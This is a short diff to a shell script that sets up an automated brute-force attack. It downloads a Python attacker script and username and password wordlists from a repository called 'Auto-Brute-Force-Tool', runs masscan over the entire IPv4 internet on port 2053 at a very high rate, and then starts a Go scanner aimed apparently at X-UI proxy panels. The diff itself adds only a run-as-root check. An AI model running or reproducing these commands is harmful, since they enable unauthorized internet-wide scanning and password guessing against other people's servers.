@@ -1,3 +1,7 @@
+if [ "$EUID" -ne 0 ]; then
+  echo "Please run as root"
+  exit
+fi
     curl -o xui.py "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/xui.py"
     curl -o password.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/password.txt"
     curl -o username.txt "https://raw.githubusercontent.com/CXK-Computer/Auto-Brute-Force-Tool/refs/heads/main/username.txt"
@@ -20,5 +24,6 @@
     screen -r aissist
     masscan --exclude 255.255.255.255 -p2053 --max-rate 100000 -oG results2053.txt 0.0.0.0/0
     HOME=/root go run scan_xui.go
+
 
 
